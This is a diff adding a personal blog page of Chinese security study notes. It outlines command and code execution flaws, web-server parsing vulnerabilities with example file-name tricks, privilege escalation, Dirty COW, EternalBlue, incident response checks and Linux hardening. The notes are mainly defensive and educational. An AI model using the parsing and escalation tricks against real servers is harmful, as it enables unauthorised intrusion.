+					继承web服务程序的权限去执行系统命令或者读写文件，反弹shell，控制整个网站和服务器，进一步渗透。
+				命令执行漏洞防御
+					禁止使用危险函数
+					对危险函数的参数进行过滤
+			代码执行漏洞
+				代码执行漏洞是什么
+					当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞。
+				代码执行漏洞的原因
+					应用有时候会考虑代码的简洁性，灵活性，会在代码中调用eval之类的函数。
+				代码执行漏洞利用
+					应用的所有配置都在数据库中存储着，通过这个函数，直接读取配置，不需要使用正则之类的来一点一点读取配置。
+				漏洞的条件
+					think.php存在执行漏洞
+					代码审计
+				代码执行漏洞防御
+					使用json保存数组，当读取时就不需要使用eval了
+					对于必须使用eval的地方，一定严格处理用户数据（白名单、黑名单）
+					字符串使用单引号包括可控代码，插入前使用addslashes转义（addslashes、魔数引号、htmlspecialchars、 htmlentities、mysql_real_escape_string）
+					放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换（preg_replace_callback()）
+					若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象（preg_replace+正则）
+			逻辑漏洞
+				逻辑漏洞是什么
+					业务逻辑漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误
+				逻辑漏洞的危害
+					任意用户的密码重置
+					提权越权
+					任意金额的购买
+					验证码绕过
+				逻辑漏洞的防御
+					确保将应用程序各方面的设计信息都详细的记录在文档中，方便其他人了解设计者做出的每个假设。
+					要求源代码提供清楚的注释，包括每个代码的组件的用途和预计用法以及每个组件对它无法直接控制的内容做出的假设。
+					根据会话确定用户的身份和权限，不要根据请求的其他特性对用户的权限做出假设
+				逻辑漏洞产生原因
+					字面意思
+			apache 1.x 2.x解析漏洞
+				www.baidu.com/a.php.a 利用阿帕奇从右到左解析机制形成的漏洞
+					（1）如果在 Apache 的配置文件中有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php. 即使文件名是 test2.php.jpg 也会以 php 来执行。
+					（2）如果在 Apache 的配置文件中有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。
+			IIS 6.0解析漏洞
+				目录解析：www.baidu.com/a.asp/a.jpg
+					原理：服务器默认会把a.asp目录下的文件解析成asp
+				;无法解析向左继续解析
+			nginx解析漏洞
+				www.baidu.com/xxx/image/1.jpg/1.php
+				原理与nginx一样，都是由于php配置文件中，开启了cgi.fix_pathinfo，但这并不是IIS7.5本身的漏洞
+			windows解析漏洞
+				原理：windows命名机制会自动去除后缀的点跟空格
+			iis10.0短文件名漏洞
+				原理：在cmd中文件名后加~1会爆出文件名头的全部文件
+			EXP提权
+				1、查看补丁情况
+					看补丁：主要是看下打了什么补丁，以及补丁版本号什么的。
+					看系统信息：主要是收集服务器是什么系统？具体叫什么名字？以及多少位几核等信息。
+				2、查看进程：tasklist /svc
+				3、上传溢出漏洞利用 exp 进行提权
+			Dirty COW脏牛漏洞
+				原理
+					Linux 内核内存子系统的 COW 机制在处理内存写入时存在竞争，导致只读内存页可能被篡改。
+				影响范围
+					Linux kernel >= 2.6.22
+				漏洞影响
+					低权限用户可以利用该漏洞写入对自身只读的内存页（包括可写文件系统上对该用户只读的文件）并提权至 root
+			webshell
+				webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门
+			永恒之蓝
+				什么是永恒之蓝
+					是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机
+				SMB
+					是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。
+				原理
+					永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序
+		日志分析的方法技巧
+			系统日志
+				分析方法
+					前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。
+					Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”
+					导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。
+			WEB访问日志
+				分析方法
+					找到中间件的web日志，打包到本地方便进行分析
+					荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。 Linux下，使用Shell命令组合查询分析
+			日志的登陆类
+				2
+					交互式登陆（用户从控制台登陆）
+				3
+					网络（例如：通过net use，访问共享网络）
+				4
+					批处理（为批处理程序保留）
+				5
+					服务启动（服务登陆）
+				6
+					不支持
+				7
+					解锁（带密码保护的屏幕保护程序的无人值班工作站）
+				8
+					网络明文（IIS服务器登录验证）
+				10
+					远程交互（终端服务，远程桌面，远程辅助）
+				11
+					缓存域证书登录
+		漏洞如何修复
+			    关注最新漏洞情况，选择性的进行修复；
+			    梳理内部开放服务，了解哪些对外开放能内网访问的绝不开放公网；
+			    开放公网的服务必须做好访问控制；
+			    避免弱密码；避免弱密码；避免弱密码；
+			以上内容只是理想状态，实际情况即使有安全部门以上内容也不一定能全部做到，业务的快速迭代，开发安全意识的各不相同，跨部门沟通上出现问题等等都会导致出现问题
+	应急/溯源分析
+		window应急
+			常见的应急响应事件分类：
+				web入侵：网页挂马、主页篡改、Webshell
+				系统入侵：病毒木马、勒索软件、远控后门
+				网络攻击：DDOS攻击、DNS劫持、ARP欺骗
+			入侵排查思路
+				检查系统账号安全
+					查看服务器是否有弱口令，远程管理端口是否对公网开放。
+						检查方法：据实际情况咨询相关服务器管理员。
+					查看服务器是否存在可疑账号、新增账号。
+						检查方法：打开 cmd 窗口，输入lusrmgr.msc命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉
+					查看服务器是否存在隐藏账号、克隆账号
+						检查方法：a、打开注册表 ，查看管理员对应键值。b、使用D盾_web查杀工具，集成了对克隆账号检测的功能
+					结合日志，查看管理员登录时间、用户名是否存在异常
+						检查方法
+							Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”
+							导出Windows日志–安全，利用Log Parser进行分析
+				检查异常端口、进程
+					检查端口连接情况，是否有远程连接、可疑连接
+						检查方法
+							netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED
+							根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist  | findstr “PID”
+					进程
+						开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等
+						打开D盾_web查杀工具，进程查看，关注没有签名信息的进程
+						通过微软官方提供的 Process Explorer 等工具进行排查
+						查看可疑的进程及其子进程。可以通过观察以下内容
+							没有签名验证信息的进程
+							没有描述信息的进程
+							进程的属主
+							进程的路径是否合法
+							CPU或内存资源占用长时间过高的进程
+					小技巧
+						查看端口对应的PID： netstat -ano | findstr “port”
+						查看进程对应的PID：任务管理器–查看–选择列–PID 或者  tasklist  | findstr “PID”
+						查看进程对应的程序位置
+							任务管理器–选择对应进程–右键打开文件位置
+							运行输入 wmic，cmd界面 输入  process
+						tasklist /svc   进程–PID–服务
+						查看Windows服务所对应的端口
+							%system%/system32/drivers/etc/services（一般%system%就是C:\Windows）
+				检查启动项、计划任务、服务
+					检查服务器是否有异常的启动项
+						检查方法
+							登录服务器，单击【开始】>【所有程序】>【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下
+							单击开始菜单 >【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。
+							单击【开始】>【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项。检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马
+								HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run
+								HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+								HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce
+							利用安全软件查看启动项、开机时间管理等
+							组策略，运行gpedit.msc
+					检查计划任务
+						检查方法
+							单击【开始】>【设置】>【控制面板】>【任务计划】，查看计划任务属性，便可以发现木马文件的路径
+							单击【开始】>【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接
+					服务自启动
+						检查方法
+							单击【开始】>【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务
+				检查系统相关信息
+					查看系统版本以及补丁信息
+						检查方法：单击【开始】>【运行】，输入systeminfo，查看系统信息
+					查找可疑目录及文件
+						检查方法
+							查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。Window 2003  C:\Documents and SettingsWindow 2008R2  C:\Users\
+							单击【开始】>【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件
+							在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件
+				自动化查杀
+					病毒查杀
+						检查方法：下载安全软件，更新最新病毒库，进行全盘扫描
+					webshell查杀
+						检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足
+				日志分析
+					系统日志
+						分析方法
+							前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。
+							Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”
+							导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。
+					WEB访问日志
+						分析方法
+							找到中间件的web日志，打包到本地方便进行分析
+							荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。 Linux下，使用Shell命令组合查询分析
+		linux加固
+			1、修改系统的密码策略
+				vim /etc/login.defs
+			2、对用户密码强度的设定
+				/etc/pam.d/sysetm-auth
+			3、限制用户登陆
+				vim  /etc/hosts.deny
+			4、限制登陆次数
+				/etc/pam.d/sshd
+			5、文件目录权限
+				在用户登陆中非常重要的三个文件
+					/etc/passwd 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644
+					/etc/shadow 只有root可读 –r--------  权限值为400
+					/etc/group 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644
+			6、SSH安全（禁止Root用户远程登录）
+				vim /etc/ssh/sshd_config
+			7、telnet安全
+				早期的Linux默认开启telnet服务，telnet,ftp,rlogin都是明文传输的协议，如果必须使用telnet，则需要进行安全配置：
+					/etc/xinetd.d/telnet
+						disable=yes
+			8、禁止匿名ftp
+				 vim  /etc/vsftpd/vsftpd.conf
+					anonymous_enable=NO 
+					#如果存在anonymous_enable则修改,如果不存在则手动增加
+			9、预防Flood攻击
+				vim  /etc/sysctl.conf
+					net.ipv4.tcp_syncookies = 1
+						sysctl  -p  #让命令生效
+			10、禁止ping
+				# echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 开启
+				# echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all  关闭
+			11、建立日志服务器 
+		windows查看系统日志
+			win+r -> 输入eventvwr.msc
+			控制面板 -> 管理工具中找到“事件查看器”
+		溯源分析的思路流程
+			首先在针对样本中涉及的域名及其解析IP的关联分析
+			分析其攻击特征（如爆破字典，社会工程学相关内容）
+			可根据后续列出的IOCs信息对相关主机进行排查
+			查看相关主机CPU是否运行有异常，比如CPU占用过高
+			查看内网主机及相关端口如445、1433、3389、65529、65533等端口是否开启且有过被扫描或暴力破解行为
+			检测相关主机是否存在CVE-2017-8570及MS17-010高危漏洞
+			追查同样本邮件相关的邮箱地址，在其接收邮件主机同网域内进行全面检测扫描
+			从分析结果获取木马存在的位置和相关程序的进程进行查杀
+		勒索病毒的处置思路
+			了解现场的情况
+			了解发生病毒的时间
+			了解所有主机服务器的系统架构
+			确认被感染的主机的大概范围
+			了解状况都对出现病毒的主机进行网络隔离，以及U盘，硬盘的隔离
+			文件检测
+			进程检测
+			系统信息检测
+			工具检测
+			日志分析
+			处置病毒
+	培训
+		安全事件有什么
+			恶意程序事件
+				计算机病毒事件，蠕虫事件，特洛伊木马事件，僵尸网络事件，混合攻击程序事件，网页内嵌恶意代码事件，其他有害程序事件
+			网络攻击事件
+				拒绝服务器攻击事件，后门攻击事件，漏洞攻击事件，网络扫描窃听事件，网络钓鱼事件，干扰事件，其他网络攻击事件
+			信息破坏事件
+				信息篡改事件，信息假冒事件，信息泄露事件，信息窃取事件，信息丢失事件，其他信息破坏事件
+			信息内容安全事件
+				违反宪法和法律，行政法规的信息安全事件、针对社会事项进行讨论评论形成网上敏感的舆论热点，出现一定规模炒作的信息安全事件、组织串联，煽动集会游行的信息安全事件、其他信息内容安全事件
+			设备设施故障
+				软硬件自身故障、外围保障设施故障、人为破坏事故、其他设备设施故
+			灾害性事件
+			其他信息安全事件
+		拒绝服务事件
+			通过大流量DDOS或者CC攻击目标，使服务器无法提供正常服务
+		造成网页内容发生篡改的有可能的网络层面的原因是
+			DNS劫持
+		常用工具
+			windows下常用的进程分析工具
+				PCHunter
+			启动项目管理工具
+				autoruns	
+			查看端口和线程的小工具
+				TCPView
+			数据流量包监控
+				Wireshark
+		永恒之蓝漏洞补丁号
+			MS17-010
+		 Google hacking 技术可以实现
+			发现站点中历史遗留的webshell后门
+			发现站点的敏感目录
+			找到某种博彩的SEO
+		漏洞检测的主要形式
+			主动式策略
+			被动式策略
+			直接测试
+			推断
+			带凭证的测试
+		影响同源策略的因素
+			同域名
+			同端口
+			同协议
+		AF日志分析的方法
+			利用工具将日志还原成我们能理解的数据
+			根据规则库描述信息对日志进行分析
+			利用第三方（如nvd，cnnvd，搜索引擎等）、CVE编号，MS编号等对日志做分析
+			根据AF记录的请求以及响应内容进行分析
+		linux命令
+			改变文件属性使其不可被修改的命令
+				chattr +i
+			文件特殊属性
+				lsattr
+		黑链可能会被插入的地方
+			指定站点注入目标
+			提升目标XSS链接
+			将隐藏的JavaScript注入目标站点
+			重定向注入目标
+			批量植入html页面
+			服务端劫持
+			页面篡改
+			驱动隐藏
+			Rwrite重写
+			nginx配置文件篡改
+		webshell查杀工具
+			D盾
+			webshellkiller
+			河马webshell
+			WEBDIR+
+			CloudWalker
+		脆弱性识别
+			渗透性测试
+			工具检测
+			人工核查
+		网络扫描
+			端口扫描
+			指纹扫描
+			TCP扫描
+			漏洞扫描
+		黑产排查方法
+			复现黑链存在的现象
+			确认页面劫持的节点
+			根据节点劫持的位置判断是否有权限范围内可操作
+			若在操作权限内，根据被篡改的情况恢复数据或配置</p>
+								<footer>
+									
+								</footer>
+							</article>
+
+					</div>
+
+				<!-- Footer -->
+					<section id="footer">
+						
+						<p class="copyright"> Copyright &copy;2021 grapefruits, supported by GitHub <br>友情链接： <a href="https://github.com/">github</a></p>
+					</section>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+			<script type="text/javascript" class="autoinsert" src="assets/js/jquery-1.2.6.min.js"></script>
+			<script src="assets/js/snowfall.jquery.js"></script>
+			<!--鼠标点击爱心-->
+			<script src="assets/js/aixin.js"></script>
+			<!-- title变化 -->
+			<script type="text/javascript">
+				 var hiddenProperty = 'hidden' in document ? 'hidden' :
+					 'webkitHidden' in document ? 'webkitHidden' :
+					 'mozHidden' in document ? 'mozHidden' : null;
+				 var title = document.querySelector('title');
+				 var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+				 var onVisibilityChange = function() {
+					 if (!document[hiddenProperty]) {
+						 title.innerHTML = '<(￣3￣)>欢迎回来小可爱~';
+						 setTimeout(() => {
+							 title.innerHTML = 'Grapefruits3-world';
+						 }, 2000)
+					 } else {
+						 title.innerHTML = ' Ծ‸Ծ Come back baby~';
+					 }
+				 }
+				 document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+					
+			</script>
+			<!--花瓣-->
+			<script>
+			
+					$(document).snowfall('clear');
+			
+					$(document).snowfall({
+			
+						image: "images/huaban.png",
+			
+						flakeCount:30,
+			
+						minSize: 5,
+			
+						maxSize: 22
+			
+					});
+			
+			</script>
+				<script type="text/javascript">
+					
+					
+					//前端读取本地文件的内容   下面代码中的this.result即为获取到的内容
+					function upload(input) {  //支持chrome IE10  
+					    if (window.FileReader) {  
+					        var file = input.files[0];  
+					        filename = file.name.split(".")[0];  
+					        var reader = new FileReader();  
+					        reader.onload = function() {  
+					            console.log(this.result)  
+					            alert(this.result);  
+					        }  
+					        reader.readAsText(file);  
+					    }   
+					    //支持IE 7 8 9 10  
+					    else if (typeof window.ActiveXObject != 'undefined'){  
+					        var xmlDoc;   
+					        xmlDoc = new ActiveXObject("Microsoft.XMLDOM");   
+					        xmlDoc.async = false;   
+					        xmlDoc.load(input.value);   
+					        alert(xmlDoc.xml);   
+					    }   
+					    //支持FF  
+					    else if (document.implementation && document.implementation.createDocument) {   
+					        var xmlDoc;   
+					        xmlDoc = document.implementation.createDocument("", "", null);   
+					        xmlDoc.async = false;   
+					        xmlDoc.load(input.value);   
+					        alert(xmlDoc.xml);  
+					    } else {   
+					        alert('error');   
+					    }   
+					}  
+					
+
+				</script>
+
+	</body>
+</html>
